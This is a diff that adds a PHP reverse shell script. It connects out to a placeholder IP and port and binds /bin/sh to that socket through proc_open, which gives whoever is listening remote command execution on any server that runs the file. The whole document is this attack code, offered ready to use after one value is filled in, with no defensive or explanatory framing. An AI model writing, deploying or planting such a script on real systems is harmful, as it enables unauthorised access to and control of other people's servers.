@@ -1,0 +1,51 @@
+<?php
+// Error reporting (optional, good for debugging)
+ini_set('display_errors', 1);
+error_reporting(E_ALL);
+
+try {
+    // IP and port of your machine
+    $ip = 'YOUR_IP_ADDRESS';  // Replace with your local machine's IP
+    $port = 1234;  // The port you're listening on
+
+    // Create a socket connection to the specified IP and port
+    $sock = @fsockopen($ip, $port);
+
+    // Check if the socket is opened successfully
+    if (!$sock) {
+        throw new Exception("Could not establish socket connection to $ip:$port");
+    }
+
+    // Open a shell process
+    $proc = @proc_open('/bin/sh', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
+
+    // Check if the shell process was opened successfully
+    if (!is_resource($proc)) {
+        throw new Exception("Failed to open shell process");
+    }
+
+    // Keep the shell open and handle input/output
+    while (true) {
+        if (feof($sock)) {
+            throw new Exception("Connection closed by remote host");
+        }
+
+        // Read input from the socket and write it to the shell process
+        fwrite($sock, fread($sock, 2048));
+    }
+
+} catch (Exception $e) {
+    // Catch and echo any exception to the web page
+    echo "Error: " . $e->getMessage();
+    // Optionally, log errors to a file if you don't want them on the page
+    // error_log($e->getMessage(), 3, '/path/to/error.log');
+}
+
+// Ensure cleanup on exit
+if (isset($sock) && $sock) {
+    fclose($sock);
+}
+if (isset($proc) && is_resource($proc)) {
+    proc_close($proc);
+}
+?>
